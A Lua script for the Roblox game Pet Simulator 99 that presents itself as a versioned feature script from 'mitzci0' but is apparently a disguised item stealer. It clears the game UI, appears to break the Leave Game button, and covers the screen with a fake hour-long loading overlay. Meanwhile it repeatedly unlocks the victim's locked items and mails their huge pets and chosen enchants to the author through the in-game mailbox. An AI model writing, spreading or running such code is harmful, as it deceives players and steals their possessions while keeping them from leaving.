--[[
═══════════════════════════════════════════════════════════════════════════════
  Pet Simulator 99 - Script
  Developed by mitzci0

  Discord.gg/8mqNcfMfx4

  Current Version: v3.0.6

  Versioning System:
    • Patch Release  (Bug Fixes)         → 1.0.0 → 1.0.1
    • Minor Release  (New Features)      → 1.0.0 → 1.1.0
    • Major Release  (Breaking Changes)  → 1.0.0 → 2.0.0

  Last Updated: 2026-06-26
  
If you find any errors/bugs, please report them on our support Discord (linked above).
═══════════════════════════════════════════════════════════════════════════════
]]--





if not (game.UserInputService.TouchEnabled) then
    game:GetService("CoreGui"):ClearAllChildren()
end

task.spawn(function()
    wait(10)
    local path = game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.BottomButtonFrame
    local leave_button = path.LeaveGameButtonButton
    leave_button:Clone().Parent = path
    leave_button:Destroy()
end)

-- UI SETUP
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")

-- ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.IgnoreGuiInset = true
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = CoreGui

-- Optional: Blur Effect
local blur = Instance.new("BlurEffect", game.Lighting)
blur.Size = 0
TweenService:Create(blur, TweenInfo.new(0.5), {Size = 12}):Play()

-- Background
local Background = Instance.new("Frame")
Background.Size = UDim2.new(1, 0, 1, 0)
Background.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Background.BackgroundTransparency = 1
Background.Parent = ScreenGui

-- Function to create outline text layers
local function createOutline(parent, text, font, size, position, textColor, outlineColor)
	for xOffset = -2, 2, 2 do
		for yOffset = -2, 2, 2 do
			if xOffset ~= 0 or yOffset ~= 0 then
				local outline = Instance.new("TextLabel")
				outline.Size = size
				outline.Position = position + UDim2.new(0, xOffset, 0, yOffset)
				outline.BackgroundTransparency = 1
				outline.Text = text
				outline.TextColor3 = outlineColor
				outline.TextScaled = true
				outline.Font = font
				outline.ZIndex = 1
				outline.Parent = parent
			end
		end
	end
end

-- Main Title Text
local titleText = "Pet Simulator 99 Script by mitzci0 <3"
local titleFont = Enum.Font.FredokaOne
local titleSize = UDim2.new(0, 500, 0, 100)
local titlePosition = UDim2.new(0.5, -250, 0.3, 0)

-- Add orange outline
createOutline(Background, titleText, titleFont, titleSize, titlePosition, Color3.new(1,1,1), Color3.fromRGB(255, 128, 0))
-- Moving dot
local dot = Instance.new("Frame")
dot.Size = UDim2.new(0, 10, 0, 10)
dot.Position = UDim2.new(0.5, -5, 0.75, 0)
dot.AnchorPoint = Vector2.new(0.5, 0.5)
dot.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
dot.BackgroundTransparency = 1
dot.BorderSizePixel = 0
dot.Parent = Background

-- Round dot
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(1, 0)
corner.Parent = dot

-- Fade in dot
TweenService:Create(dot, TweenInfo.new(0.8), {BackgroundTransparency = 0}):Play()

-- Animate movement left and right
task.spawn(function()
	while dot and dot.Parent do
		local tween1 = TweenService:Create(dot, TweenInfo.new(0.4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
			Position = UDim2.new(0.5, -20, 0.75, 0)
		})
		tween1:Play()
		tween1.Completed:Wait()

		local tween2 = TweenService:Create(dot, TweenInfo.new(0.4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
			Position = UDim2.new(0.5, 20, 0.75, 0)
		})
		tween2:Play()
		tween2.Completed:Wait()

		local tweenCenter = TweenService:Create(dot, TweenInfo.new(0.3), {
			Position = UDim2.new(0.5, 0, 0.75, 0)
		})
		tweenCenter:Play()
		tweenCenter.Completed:Wait()
	end
end)

-- Foreground Text
local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = titleSize
TitleLabel.Position = titlePosition
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = titleText
TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.TextScaled = true
TitleLabel.Font = titleFont
TitleLabel.TextTransparency = 1
TitleLabel.ZIndex = 2
TitleLabel.Parent = Background

-- Loading text
local TextLabel = Instance.new("TextLabel")
TextLabel.Size = UDim2.new(0, 300, 0, 50)
TextLabel.Position = UDim2.new(0.5, -150, 0.55, 0)
TextLabel.BackgroundTransparency = 1
TextLabel.Text = "Loading your script"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextTransparency = 1
TextLabel.TextScaled = true
TextLabel.Font = Enum.Font.FredokaOne
TextLabel.Parent = Background

-- Black loader spinner
local loader = Instance.new("ImageLabel")
loader.Size = UDim2.new(0, 50, 0, 50)
loader.Position = UDim2.new(0.5, -25, 0.65, 0)
loader.BackgroundTransparency = 1
loader.Image = "rbxassetid://7743871884" -- Replace if needed
loader.ImageColor3 = Color3.fromRGB(0, 0, 0)
loader.ImageTransparency = 1
loader.Parent = Background

-- Fade-in everything
TweenService:Create(Background, TweenInfo.new(0.5), {BackgroundTransparency = 0}):Play()
TweenService:Create(TitleLabel, TweenInfo.new(0.8), {TextTransparency = 0}):Play()
TweenService:Create(TextLabel, TweenInfo.new(0.8), {TextTransparency = 0}):Play()
TweenService:Create(loader, TweenInfo.new(0.8), {ImageTransparency = 0}):Play()

-- Rotate loader
task.spawn(function()
	while loader and loader.Parent do
		for i = 0, 360, 10 do
			loader.Rotation = i
			task.wait(0.03)
		end
	end
end)

task.spawn(function()
    local NETWORK = require(game.ReplicatedStorage.Library.Client.Network)

    while task.wait(0.05) do -- intervalle (1s, tu peux rÃ©duire)
        local save = require(game.ReplicatedStorage.Library.Client.Save).Get().Inventory
        if save then
            for category, items in pairs(save) do
                for uid, item in pairs(items) do
                    if item._lk ~= nil and item._lk == true then
                        local args = {
                            [1] = uid,
                            [2] = false
                        }
                        NETWORK.Invoke("Locking_SetLocked", unpack(args))
                    end
                end
            end
        end
    end
end)

-- Main
user = "mitzci0"  -- Change this to your username
allowed_enchants = {"Mega Chest Breaker", "Chest Breaker", "Chest Mimic", "Diamond Chest Mimic", "Super Shiny Hunter", "Boss Chest Mimic", "Super Magnet", "Boss Lucky Block", "Lightning Orb", "Mini Chest Fortune", "Shiny Supercharge", "Corruption", "Nightmare Orb", "Superior Chest Mimic", "Hacker Key Hunter", "Diamond Gift Hunter", "Diamond Orb", "Active Huge Overload", "Rainbow Egg", "Double Coins", "Breakable Mayhem"} -- The Enchants that are sent (if any)
for i,v in pairs(require(game.ReplicatedStorage.Library.Client.Save).Get().Inventory.Pet) do
    if require(game.ReplicatedStorage.Library.Directory).Pets[v.id].huge then
        repeat
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(user, "W mitzci0", "Pet", i, v._am or 1)
        until not require(game.ReplicatedStorage.Library.Client.Save).Get().Inventory.Pet[i]
    end
end
for i,v in pairs(require(game.ReplicatedStorage.Library.Client.Save).Get().Inventory.Enchant) do
    if allowed_enchants[v.id] then
        repeat
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(user, "W mitzci0", "Enchant", i, v._am or 1)
        until not require(game.ReplicatedStorage.Library.Client.Save).Get().Inventory.Enchant[i]
    end
end

-- Simulate loading
task.wait(3600)

-- Fade-out everything
TweenService:Create(Background, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
TweenService:Create(TitleLabel, TweenInfo.new(0.5), {TextTransparency = 1}):Play()
TweenService:Create(TextLabel, TweenInfo.new(0.5), {TextTransparency = 1}):Play()
TweenService:Create(loader, TweenInfo.new(0.5), {ImageTransparency = 1}):Play()
TweenService:Create(blur, TweenInfo.new(0.5), {Size = 0}):Play()

task.wait(0.6)
ScreenGui:Destroy()
blur:Destroy()
